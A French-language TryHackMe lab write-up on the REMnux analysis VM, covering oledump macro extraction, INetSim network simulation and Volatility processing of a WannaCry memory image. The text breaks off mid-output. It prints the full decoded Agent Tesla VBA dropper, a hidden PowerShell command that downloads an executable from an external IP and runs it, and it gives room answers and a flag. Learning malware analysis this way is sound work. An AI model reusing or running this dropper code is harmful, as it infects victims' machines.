---
title: "TryHackMe - REnux Getting Started"
date: 2025-10-31 09:20:00 +0200
categories: [TryHackMe, Learning]
tags: [REMnux]
description: "Write-up de la room RENUX qui nous apprendre ce qu'est REnux ainsi qui les outils qui le composent"
image:
  path: /assets/img/posts/tryhackme-introduction-SIEM.png
  alt: "REnux getting started"
---

## Informations sur la room

Découvrez comment utiliser les outils à l'intérieur de la machine virtuelle REMnux.

**Lien :** [REnux Getting Started](https://tryhackme.com/room/remnuxgettingstarted)

## Objectifs d'apprentissage

Cette room couvre les compétences suivantes :

- Explorez les outils de la machine virtuelle REMnux.
- Apprenez à utiliser les outils pour analyser efficacement les documents potentiellement malveillants.
- Apprenez à simuler un réseau factice pour faciliter l'analyse.
- Familiarisez-vous avec les outils d'analyse des images mémoire.

---

## Solutions des tâches

### Task 1 - Introduction

L'analyse de logiciels potentiellement malveillants peut s'avérer complexe, surtout dans le cadre d'un incident de sécurité en cours. Cette analyse met la pression sur l'analyste. La plupart du temps, les résultats doivent être aussi précis que possible, et les analystes utilisent différents outils, machines et environnements pour y parvenir. Dans cette salle, nous utiliserons la **machine virtuelle REMnux**.

REMnux VM est une distribution Linux spécialisée. Elle intègre déjà des outils tels que `Volatility`, `YARA`, `Wireshark`, `oledump` et `INetSim`. Elle offre également un **environnement isolé** (sandbox) pour analyser les logiciels potentiellement malveillants sans risquer votre système principal. Votre laboratoire est ainsi configuré et opérationnel immédiatement, sans aucune installation manuelle.

### Task 2 - Machine Access

Lancer la machine mise a disposition

### Task 3 - File Analysis

`Oledump.py` est un outil Python qui analyse les fichiers `OLE2`, également appelés **fichiers binaires de stockage structuré** ou fichiers binaires composés. OLE (Object Linking and Embedding) est une technologie propriétaire développée par Microsoft. Les fichiers **OLE2** servent généralement à stocker plusieurs types de données, comme des documents, des feuilles de calcul et des présentations, dans un seul fichier. Cet outil est pratique pour extraire et examiner le contenu des fichiers OLE2, ce qui en fait une ressource précieuse pour l'**analyse forensique** et la détection de logiciels malveillants.

À l'aide de la machine virtuelle associée à la tâche 2 (REMNUX VM), accédez au répertoire `/home/ubuntu/Desktop/tasks/agenttesla/`. Le fichier cible se nomme `agenttesla.xlsm`. Exécutez la commande `oledump.py agenttesla.xlsm`. Consultez le terminal ci-dessous.

```bash
ubuntu@10.10.214.227:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```

D'après l'analyse de fichiers d'OleDump, un script **VBA** pourrait être intégré au document et se trouver dans le fichier `xl/vbaProject.bin`. OleDump lui attribuera donc l'index **A**, bien que celui-ci puisse parfois varier. Les éléments **A (index) + chiffres** correspondent aux flux de données.

Il est important de prêter attention au **flux de données commençant par la lettre M**. Cela indique la présence d'une macro; vous pourriez vouloir examiner ce flux de données, « `VBA/ThisWorkbook` ».

Vérifions-le ! Exécutons la commande `oledump.py agenttesla.xlsm -s 4`. Cette commande lancera OleDump et examinera le flux de données qui nous intéresse grâce au paramètre `-s 4`. Le paramètre `-s` signifie « **sélectionner** » et le chiffre `4` indique que le flux de données recherché se trouve en quatrième position (`A4 : M 688 « VBA/ThisWorkbook` »).

```bash
ubuntu@10.10.214.227:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
```

Voici le résultat de la commande :

```bash
00000000: 01 AC B2 00 41 74 74 72  69 62 75 74 00 65 20 56  ....Attribut.e V
00000010: 42 5F 4E 61 6D 00 65 20  3D 20 22 54 68 69 00 73  B_Nam.e = "Thi.s
00000020: 57 6F 72 6B 62 6F 6F 10  6B 22 0D 0A 0A 8C 42 61  Workboo.k"....Ba
00000030: 73 01 02 8C 30 7B 30 30  30 32 30 50 38 31 39 2D  s...0{00020P819-
00000040: 00 10 30 03 08 43 23 05  12 03 00 34 36 7D 0D 7C  ..0..C#....46}.|
00000050: 47 6C 10 6F 62 61 6C 01  D0 53 70 61 82 63 01 92  Gl.obal..Spa.c..
00000060: 46 61 6C 73 65 0C 25 00  43 72 65 61 74 61 62 6C  False.%.Creatabl
00000070: 01 15 1F 50 72 65 64 65  63 6C 12 61 00 06 49 64  ...Predecl.a..Id
00000080: 00 23 54 72 75 81 0D 22  45 78 70 6F 73 65 01 1C  .#Tru.."Expose..
00000090: 01 11 40 54 65 6D 70 6C  61 74 40 65 44 65 72 69  ..@Templat@eDeri
000000A0: 76 96 12 43 80 75 73 74  6F 6D 69 7A 84 44 0D 83  v..C.ustomiz.D..
000000B0: 32 50 80 18 80 1C 20 53  75 62 02 20 05 92 5F 4F  2P.... Sub. .._O
000000C0: 70 65 6E 28 00 29 0D 0A  44 69 6D 20 53 00 71 74  pen(.)..Dim S.qt
000000D0: 6E 65 77 20 41 73 04 20  53 80 25 6E 67 2C 20 73  new As. S.%ng, s
000000E0: C0 4F 75 74 70 75 74 07  09 03 14 00 4D 67 67 63  .Output.....Mggc
000000F0: 62 6E 75 61 02 64 01 0C  4F 62 6A 65 63 74 42 2C  bnua.d..ObjectB,
00000100: 07 0A 45 78 65 63 07 0C  0D 06 0A 04 2B 00 BD 5E  ..Exec......+..^
00000110: 70 2A 6F 5E 00 2A 77 2A  65 2A 72 2A 73 10 5E 5E  p*o^.*w*e*r*s.^^
00000120: 2A 68 80 04 6C 5E 2A 00  6C 2A 20 2A 5E 2D 2A 57  *h..l^*.l* *^-*W
00000130: 00 2A 69 2A 6E 2A 5E 64  2A 00 6F 2A 77 5E 2A 53  .*i*n*^d*.o*w^*S
00000140: 2A 74 A0 2A 79 2A 5E 6C  00 11 20 00 14 02 69 01  *t.*y*^l.. ...i.
00000150: 0C 64 2A 5E 65 2A 6E 2A  5E 00 08 2D 00 0B 78 41  .d*^e*n*^..-..xA
00000160: 03 63 2A 12 75 00 0A 5E  69 00 0D 6E 2A 70 40 6F  .c*.u..^i..n*p@o
00000170: 6C 5E 69 63 79 C0 07 62  00 2A 79 70 5E 5E 61 73  l^icy..b.*yp^^as
00000180: 73 20 2A 3B 2A 20 24 01  4D 46 69 0A 6C 41 12 3D  s *;* $.MFi.lA.=
00000190: C0 00 5B 2A 49 2A 80 4F  2A 2E 2A 50 2A 61 C0 0E  ..[*I*.O*.*P*a..
000001A0: 00 68 2A 5D 2A 3A 3A 47  65 1A 74 40 09 2A 83 09  .h*]*::Ge.t@.*..
000001B0: 41 79 28 29 20 40 7C 20  52 65 6E 5E C0 02 2D 00  Ay() @| Ren^..-.
000001C0: 49 74 5E 65 6D 20 2D 4E  04 65 77 42 9A 7B 20 24  It^em -N.ewB.{ $
000001D0: 5F 20 18 2D 72 65 40 62  40 82 27 74 6D 00 70 24  _ .-re@b@.'tm.p$
000001E0: 27 2C 20 27 65 78 80 65  27 20 7D 20 96 50 C1 1D  ', 'ex.e' } .P..
000001F0: 00 54 68 72 75 3B 20 49  6E 00 5E 76 6F 2A 6B 65  .Thru; In.^vo*ke
00000200: 2D 57 00 65 5E 62 52 65  2A 71 75 00 65 73 74 20  -W.e^bRe*qu.est 
00000210: 2D 55 5E 72 00 69 20 22  22 68 74 74 70 00 3A 2F  -U^r.i ""http.:/
00000220: 2F 31 39 33 2E 32 02 30  C3 00 36 37 2F 72 74 2F  /193.2.0..67/rt/
00000230: 00 44 6F 63 2D 33 37 33  37 80 31 32 32 70 64 66  .Doc-3737.122pdf
00000240: 2E 00 16 D0 22 22 20 2D  00 63 2A C1 27 07 34 02  ...."" -.c*.'.4.
00000250: 3B 80 65 2A 61 72 74 2D  50 80 72 6F 63 65 2A 73  ;.e*art-P.roce*s
00000260: 73 88 06 2B 00 B0 46 5E  52 83 2A 28 03 04 2C 20  s..+..F^R.*(.., 
00000270: 68 22 2A 22 00 01 22 C0  7D 97 08 5E 49 86 08 65  h"*"..".}..^I..e
00000280: 74 48 7C 3D 20 C2 B8 65  01 43 77 28 22 57 53 63  tH|= ..e.Cw("WSc
00000290: 72 69 00 70 74 2E 53 68  65 6C 6C EB 8E 0B C2 82  ri.pt.Shell.....
000002A0: 3D C7 03 2E 01 04 C4 18  C0 0A 08 45 6E 64 81 A3  =..........End..
```

Les résultats ci-dessus sont au format **hexadécimal**. Un œil averti y reconnaîtra peut-être certains termes. Cependant, cela reste complexe, n'est-ce pas ? Rendons-les donc plus lisibles et plus faciles à comprendre.

Nous allons ajouter le paramètre `--vbadecompress` à la commande précédente. Grâce à ce paramètre, oledump décompressera automatiquement les macros VBA compressées détectées dans un format plus lisible, facilitant ainsi l'analyse de leur contenu.

```bash
ubuntu@10.10.214.227:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

Voici le résultat de la commande:

```bash
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
Dim Sqtnew As String, sOutput As String
Dim Mggcbnuad As Object, MggcbnuadExec As Object
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
```

C'est bien mieux, n'est-ce pas ?

Nous n'avons plus besoin de lire l'intégralité du script, mais simplement de nous familiariser avec certains caractères et commandes. Ce qui nous intéresse ici, c'est l'utilité de `Sqtnew`, car si l'on examine le script, on y trouve une **adresse IP publique**, un `PDF` et un fichier `.exe`. Il serait judicieux d'approfondir la question.

```bash
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
```

Nous allons copier la première valeur de Sqtnew et la coller dans la zone de saisie de `CyberChef`. Vous pouvez ouvrir une copie locale de CyberChef dans la machine virtuelle REMnux ou accéder à la version en ligne via [ce lien](https://gchq.github.io/CyberChef/). Choisissez la méthode qui vous convient le mieux. N'hésitez pas à consulter notre forum dédié à CyberChef pour vous familiariser avec l'outil.

Ensuite, sélectionnez deux fois l'opération Find/Replace. En consultant le script, les deuxième et troisième valeurs de **Sqtnew** contiennent une commande pour remplacer respectivement `*` par `""` et `^` par `""`. Nous supposons que "" signifie qu'il n'y a pas de valeur. Ainsi, lors de la première opération, nous saisissons la valeur * et choisissons `Simple String` comme paramètre supplémentaire. En revanche, nous ne saisissons aucune valeur dans le champ Remplacer. Il en va de même pour la seconde opération : nous saisissons la valeur **^** et choisissons `Simple String`, le champ Remplacer restant vide. Voir l'image ci-dessous.

CyberChef utilise la fonction `Find/Replace` à deux reprises pour corriger un script PowerShell.

![string](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727075711805.png)

Voilà qui est plus lisible ! Cependant, pour les débutants, cela peut s'avérer difficile. Nous allons donc aborder ici les commandes les plus basiques.

```powershell
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

Analysons cela !

Dans PowerShell, le paramètre `-WindowStyle` permet de contrôler l'apparence de la fenêtre PowerShell lors de l'exécution d'un script ou d'une commande. Ici, `hidden` signifie que la fenêtre PowerShell ne sera pas visible pour l'utilisateur.

Par défaut, PowerShell restreint l'exécution des scripts pour des raisons de sécurité. Le paramètre `-executionpolicy` permet de contourner cette restriction. L'option `bypass` signifie que la stratégie d'exécution est temporairement ignorée, autorisant ainsi l'exécution de tout script sans restriction.

La commande `Invoke-WebRequest` est couramment utilisée pour télécharger des fichiers depuis Internet.

Le paramètre `-Uri` spécifie l'URL de la ressource Web à récupérer. Dans notre cas, le script télécharge la ressource Doc-3737122pdf.exe depuis http://193.203.203.67/rt/.

Le paramètre `-OutFile` spécifie le fichier local dans lequel le contenu téléchargé sera enregistré. Dans ce cas, le fichier `Doc-3737122pdf.exe` sera enregistré dans `$TempFile`.

La commande `Start-Process` permet d'exécuter le fichier téléchargé et stocké dans `$TempFile` après la requête web.

En résumé, à l'ouverture du document `agenttesla.xlsm`, une macro s'exécute. Cette macro contient un **script VBA** qui lance un **script PowerShell** pour télécharger le fichier `Doc-3737122pdf.exe` depuis http://193.203.203.67/rt/, l'enregistrer dans la variable `$TempFile`, puis exécuter ce fichier binaire (`.exe : Doc-3737122pdf.exe`). Il s'agit d'une technique courante utilisée par les cybercriminels pour éviter d'être détectés rapidement. Plutôt inquiétant, non ?

---

**What Python tool analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format?**

**Réponse :** `oledump.py`

**What tool parameter we used in this task allows you to select a particular data stream of the file we are using it with?**

**Réponse :** `-s`

**During our analysis, we were able to decode a PowerShell script. What command is commonly used for downloading files from the internet?**

**Réponse :** `Invoke-WebRequest`

**What file was being downloaded using the PowerShell script?**

**Réponse :** `Doc-3737122pdf.exe`

**During our analysis of the PowerShell script, we noted that a file would be downloaded. Where will the file being downloaded be stored?**

**Réponse :** `$TempFile`

**Using the tool, scan another file named possible_malicious.docx located in the /home/ubuntu/Desktop/tasks/agenttesla/ directory. How many data streams were presented for this file?**

J'ai exécuter la commande simple pour pouvoir avoir les data stream

```bash
ubuntu@ip-10-10-214-227:~/Desktop/tasks/agenttesla$ oledump.py possible_malicious.docx
  1:       114 '\x01CompObj'
  2:       280 '\x05DocumentSummaryInformation'
  3:       416 '\x05SummaryInformation'
  4:      7557 '1Table'
  5:    343998 'Data'
  6:       376 'Macros/PROJECT'
  7:        41 'Macros/PROJECTwm'
  8: M 1989192 'Macros/VBA/ThisDocument'
  9:      4099 'Macros/VBA/_VBA_PROJECT'
 10:       515 'Macros/VBA/dir'
 11:       112 'ObjectPool/_1649178531/\x01CompObj'
 12:        16 'ObjectPool/_1649178531/\x03OCXNAME'
 13:         6 'ObjectPool/_1649178531/\x03ObjInfo'
 14:        86 'ObjectPool/_1649178531/f'
 15:         0 'ObjectPool/_1649178531/o'
 16:      4096 'WordDocument'
```

**Réponse :** `16`

**Using the tool, scan another file named possible_malicious.docx located in the /home/ubuntu/Desktop/tasks/agenttesla/ directory. At what data stream number does the tool indicate a macro present?**

Comme on peut le voir sur la commande exécuté précédemment nous voyons que il y a un `M` ce qui veut dire qu'il y a une **Macro** et nous cherchons le numéro du data stream associé qui est donc:

**Réponse :** `8`

### Task 4 - Fake Network to Aid Analysis

Pour cette tâche nous utiliserons l'**AttaqueBox** de tryhackme en plus de la machine que nous avons lancé tout à l'heure

#### INetSim

Avant de commencer, il est nécessaire de configurer l'outil `INetSim` dans votre machine virtuelle `REMnux`. Rassurez-vous, il s'agit d'une simple modification de configuration. Commencez par vérifier l'adresse IP attribuée à votre machine. Vous pouvez l'obtenir à l'aide de la commande `ifconfig` ou tout simplement en vérifiant l'adresse IP qui suit `ubuntu@` dans le terminal. Les adresses IP peuvent varier.

```bash
ubuntu@10.10.214.227:~$
```

Ici, l'adresse IP de la machine est `10.10.214.227`. Notez-la, car nous en aurons besoin.

Ensuite, nous devons modifier la configuration d'`INetSim` en exécutant la commande suivante : `sudo nano /etc/inetsim/inetsim.conf` et en recherchant la valeur `#dns_default_ip 0.0.0.0`.

```bash
ubuntu@10.10.214.227:~$ sudo nano /etc/inetsim/inetsim.conf
#########################################
# dns_default_ip
#
# Default IP address to return with DNS replies
#
# Syntax: dns_default_ip 
#
# Default: 127.0.0.1
#
#dns_default_ip  0.0.0.0
```

Supprimez le commentaire ou le symbole **#**, puis remplacez la valeur de `dns_default_ip` (0.0.0.0) par l'adresse IP de la machine que vous avez identifiée précédemment. Dans notre exemple, il s'agit de 10.10.214.227. Enregistrez le fichier avec Ctrl+O, appuyez sur Entrée et quittez avec Ctrl+X.

Vérifiez que les modifications ont bien été prises en compte en consultant la valeur de `dns_default_ip` à l'aide de la commande suivante : `cat /etc/inetsim/inetsim.conf | grep dns_default_ip`. Voir ci-dessous.

```bash
root@ip-10-10-143-180:/etc/inetsim# cat inetsim.conf | grep dns_default_ip
# dns_default_ip
# Syntax: dns_default_ip <IP address>
dns_default_ip 10.10.143.180
```

Enfin, exécutez la commande `sudo inetsim` pour démarrer l'outil.

```bash
ubuntu@10.10.214.227:~$ sudo inetsim
INetSim 1.3.2 (2020-05-19) by Matthias Eckert & Thomas Hungenberg
Using log directory:      /var/log/inetsim/
Using data directory:     /var/lib/inetsim/
Using report directory:   /var/log/inetsim/report/
Using configuration file: /etc/inetsim/inetsim.conf
Parsing configuration file.
Warning: Unknown option '/var/log/inetsim/report/report.104162.txt#start_service' in configuration file '/etc/inetsim/inetsim.conf' line 43
Configuration file parsed successfully.
=== INetSim main process started (PID 4859) ===
Session ID:     4859
Listening on:   10.10.214.227
Real Date/Time: 2024-09-22 17:38:22
Fake Date/Time: 2024-09-22 17:38:22 (Delta: 0 seconds)
 Forking services...
  * dns_53_tcp_udp - started (PID 4863)
  * http_80_tcp - failed!
  * https_443_tcp - started (PID 4865)
  * ftps_990_tcp - started (PID 4871)
  * pop3_110_tcp - started (PID 4868)
  * smtp_25_tcp - started (PID 4866)
  * ftp_21_tcp - started (PID 4870)
  * pop3s_995_tcp - started (PID 4869)
  * smtps_465_tcp - started (PID 4867)
 done.
Simulation running.
```

Après avoir exécuté la commande, assurez-vous de voir la mention « **Simulation en cours** » en bas du résultat et ignorez le message d'erreur « **http_80_tcp — échec !** ». Notre réseau virtuel est maintenant opérationnel !

Passons à AttackBox !

#### AttackBox

Depuis cette machine virtuelle, ouvrez un navigateur et accédez à l'adresse IP de **REMnux** à l'aide de la commande `https://10.10.214.227`. Un avertissement de sécurité s'affichera; **ignorez-le**, cliquez sur « **Avancé** », puis sur « **Accepter le risque et continuer** ».

![warning](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727039504394.png)

Une fois l'opération terminée, vous serez redirigé vers la page d'accueil d'INetSim !

![inetsim](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727039504431.png)

Un comportement courant des logiciels malveillants consiste à **télécharger un autre fichier binaire ou script**. Nous allons tenter de reproduire ce comportement en récupérant un autre fichier depuis **INetsim**. Ceci peut se faire via l'interface de ligne de commande (CLI) ou un navigateur, mais utilisons la CLI pour plus de réalisme. Utilisez la commande suivante : `sudo wget https://10.10.214.227/second_payload.zip --no-check-certificate`.

```bash
root@10.10.214.227:~# sudo wget https://10.10.214.227/second_payload.zip --no-check-certificate
--2024-09-22 22:18:49--  https://10.10.214.227/second_payload.zip
Connecting to 10.10.214.227:443... connected.
WARNING: cannot verify 10.10.214.227's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u2018MACHINE_IP\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 258 [text/html]
Saving to: \u2018second_payload.zip\u2019

second_payload.zip  100%[===================>]     258  --.-KB/s    in 0s      

2024-09-22 22:18:49 (14.5 MB/s) - \u2018second_payload.zip\u2019 saved [258/258]
```

Vous pouvez également essayer de télécharger un autre fichier. Par exemple, essayez de télécharger `second_payload.ps1` à l'aide de la commande : `sudo wget https://10.10.214.227/second_payload.ps1 --no-check-certificate`.

Pour vérifier que les fichiers ont bien été téléchargés, consultez votre répertoire racine. Voir l'exemple ci-dessous.

![payloads](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727040681753.png)

Tous ces fichiers sont factices ! Essayez d'ouvrir **second_payload.ps1**. Son exécution vous redirigera vers la page d'accueil d'INetSim.

Nous avons ici imité le comportement d'un logiciel malveillant : il tente de se connecter à un serveur ou une URL, puis de télécharger un second fichier susceptible de contenir un autre logiciel malveillant.

#### Rapport de connexion

Enfin, retournez sur votre machine virtuelle REMnux et arrêtez INetSim. Par défaut, un rapport sur les connexions capturées sera généré. Ce rapport est généralement enregistré dans le répertoire `/var/log/inetsim/report/`. Vous devriez y voir un résultat similaire à celui-ci.

```bash
Report written to '/var/log/inetsim/report/report.2594.txt' (14 lines)
=== INetSim main process stopped (PID 2594) ===
```

Lisez le fichier à l'aide de la commande suivante : `sudo cat /var/log/inetsim/report/report.2594.txt`. Cette commande peut varier selon votre machine.

```bash
ubuntu@10.10.214.227:~$ sudo cat /var/log/inetsim/report/report.2594.txt
=== Report for session '2594' ===

Real start date            : 2024-09-22 21:04:42
Simulated start date       : 2024-09-22 21:04:42
Time difference on startup : none

2024-09-22 21:04:53  First simulated date in log file
2024-09-22 21:04:53  HTTPS connection, method: GET, URL: https://10.10.214.227/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:16:07  HTTPS connection, method: GET, URL: https://10.10.214.227/test.exe, file name: /var/lib/inetsim/http/fakefiles/sample_gui.exe
2024-09-22 21:18:37  HTTPS connection, method: GET, URL: https://10.10.214.227/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:49  HTTPS connection, method: GET, URL: https://10.10.214.227/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:49  Last simulated date in log file
===
```

---

**Download and scan the file named flag.txt from the terminal using the command sudo wget https://10.10.214.227/flag.txt --no-check-certificate. What is the flag?**

**Réponse :** `Tryhackme{remnux_edition}`

**After stopping the inetsim, read the generated report. Based on the report, what URL Method was used to get the file flag.txt?**

**Réponse :** `GET`

### Task 5 - Memory Investigation: Evidence Preprocessing

L'une des pratiques d'investigation les plus courantes en criminalistique numérique est le prétraitement des preuves. Cela implique l'exécution d'outils et l'enregistrement des résultats au format **texte ou JSON**. L'analyste utilise souvent des outils tels que `Volatility` pour traiter les images mémoire **utilisées comme preuves**. Cet outil est déjà intégré à la machine virtuelle REMnux. Les commandes Volatility permettent d'identifier et d'extraire des artefacts spécifiques des images mémoire, et le résultat peut être enregistré dans des fichiers texte pour un examen plus approfondi. De même, nous pouvons exécuter un script utilisant les différents paramètres de l'outil pour prétraiter plus rapidement les preuves acquises.

Prétraitement avec `Volatility`

Dans cet exercice, nous utiliserons la version 3 de Volatility. Cependant, nous n'entrerons pas dans le détail de l'investigation et de l'analyse des résultats – cela nécessiterait un ouvrage entier ! L'objectif est plutôt de vous familiariser avec l'outil et son fonctionnement. Exécutez la commande comme indiqué et attendez l'affichage du résultat. Chaque plugin prend **2 à 3 minutes pour afficher le résultat**.

Voici quelques-uns des paramètres ou plugins que nous utiliserons. Nous nous concentrerons sur les plugins Windows.

- windows.pstree.PsTree
- windows.pslist.PsList
- windows.cmdline.CmdLine
- windows.filescan.FileScan
- windows.dlllist.DllList
- windows.malfind.Malfind
- windows.psscan.PsScan

#### PsTree

Ce plugin liste les processus sous forme d'arborescence en fonction de l'ID de leur processus parent.

```bash
root@10.10.214.227:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.pstree.PsTree
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

Résultat:

```bash
PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime

4	0	System	0x823c8830	51	244	N/A	False	N/A	N/A
* 348	4	smss.exe	0x82169020	3	19	N/A	False	2017-05-12 21:21:55.000000 	N/A
** 620	348	winlogon.exe	0x8216e020	23	536	0	False	2017-05-12 21:22:01.000000 	N/A
*** 664	620	services.exe	0x821937f0	15	265	0	False	2017-05-12 21:22:01.000000 	N/A
**** 1024	664	svchost.exe	0x821af7e8	79	1366	0	False	2017-05-12 21:22:03.000000 	N/A
***** 1768	1024	wuauclt.exe	0x81f747c0	7	132	0	False	2017-05-12 21:22:52.000000 	N/A
***** 1168	1024	wscntfy.exe	0x81fea8a0	1	37	0	False	2017-05-12 21:22:56.000000 	N/A
**** 1152	664	svchost.exe	0x821bea78	10	173	0	False	2017-05-12 21:22:06.000000 	N/A
**** 544	664	alg.exe	0x82010020	6	101	0	False	2017-05-12 21:22:55.000000 	N/A
**** 836	664	svchost.exe	0x8221a2c0	19	211	0	False	2017-05-12 21:22:02.000000 	N/A
**** 260	664	svchost.exe	0x81fb95d8	5	105	0	False	2017-05-12 21:22:18.000000 	N/A
**** 904	664	svchost.exe	0x821b5230	9	227	0	False	2017-05-12 21:22:03.000000 	N/A
**** 1484	664	spoolsv.exe	0x821e2da0	14	124	0	False	2017-05-12 21:22:09.000000 	N/A
**** 1084	664	svchost.exe	0x8203b7a8	6	72	0	False	2017-05-12 21:22:03.000000 	N/A
*** 676	620	lsass.exe	0x82191658	23	353	0	False	2017-05-12 21:22:01.000000 	N/A
** 596	348	csrss.exe	0x82161da0	12	352	0	False	2017-05-12 21:22:00.000000 	N/A
1636	1608	explorer.exe	0x821d9da0	11	331	0	False	2017-05-12 21:22:10.000000 	N/A
* 1956	1636	ctfmon.exe	0x82231da0	1	86	0	False	2017-05-12 21:22:14.000000 	N/A
* 1940	1636	tasksche.exe	0x82218da0	7	51	0	False	2017-05-12 21:22:14.000000 	N/A
** 740	1940	@WanaDecryptor@	0x81fde308	2	70	0	False	2017-05-12 21:22:22.000000 	N/A
```

#### PsList

Ce plugin permet d'afficher la liste de tous les processus actuellement actifs sur la machine.

```bash
root@10.10.214.227:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.pslist.PsList
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

Résultat:
```bash
PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output

4	0	System	0x823c8830	51	244	N/A	False	N/A	N/A	Disabled
348	4	smss.exe	0x82169020	3	19	N/A	False	2017-05-12 21:21:55.000000 	N/A	Disabled
596	348	csrss.exe	0x82161da0	12	352	0	False	2017-05-12 21:22:00.000000 	N/A	Disabled
620	348	winlogon.exe	0x8216e020	23	536	0	False	2017-05-12 21:22:01.000000 	N/A	Disabled
664	620	services.exe	0x821937f0	15	265	0	False	2017-05-12 21:22:01.000000 	N/A	Disabled
676	620	lsass.exe	0x82191658	23	353	0	False	2017-05-12 21:22:01.000000 	N/A	Disabled
836	664	svchost.exe	0x8221a2c0	19	211	0	False	2017-05-12 21:22:02.000000 	N/A	Disabled
904	664	svchost.exe	0x821b5230	9	227	0	False	2017-05-12 21:22:03.000000 	N/A	Disabled
1024	664	svchost.exe	0x821af7e8	79	1366	0	False	2017-05-12 21:22:03.000000 	N/A	Disabled
1084	664	svchost.exe	0x8203b7a8	6	72	0	False	2017-05-12 21:22:03.000000 	N/A	Disabled
1152	664	svchost.exe	0x821bea78	10	173	0	False	2017-05-12 21:22:06.000000 	N/A	Disabled
1484	664	spoolsv.exe	0x821e2da0	14	124	0	False	2017-05-12 21:22:09.000000 	N/A	Disabled
1636	1608	explorer.exe	0x821d9da0	11	331	0	False	2017-05-12 21:22:10.000000 	N/A	Disabled
1940	1636	tasksche.exe	0x82218da0	7	51	0	False	2017-05-12 21:22:14.000000 	N/A	Disabled
1956	1636	ctfmon.exe	0x82231da0	1	86	0	False	2017-05-12 21:22:14.000000 	N/A	Disabled
260	664	svchost.exe	0x81fb95d8	5	105	0	False	2017-05-12 21:22:18.000000 	N/A	Disabled
740	1940	@WanaDecryptor@	0x81fde308	2	70	0	False	2017-05-12 21:22:22.000000 	N/A	Disabled
1768	1024	wuauclt.exe	0x81f747c0	7	132	0	False	2017-05-12 21:22:52.000000 	N/A	Disabled
544	664	alg.exe	0x82010020	6	101	0	False	2017-05-12 21:22:55.000000 	N/A	Disabled
1168	1024	wscntfy.exe	0x81fea8a0	1	37	0	False	2017-05-12 21:22:56.000000 	N/A	Disabled
```

#### Ligne de commande

Ce plugin permet d'afficher la liste des arguments de ligne de commande des processus.

```bash
root@10.10.214.227:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.cmdline.CmdLine
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

Résultat:

```bash
PID	Process	Args

4	System	Required memory at 0x10 is not valid (process exited?)
348	smss.exe	\SystemRoot\System32\smss.exe
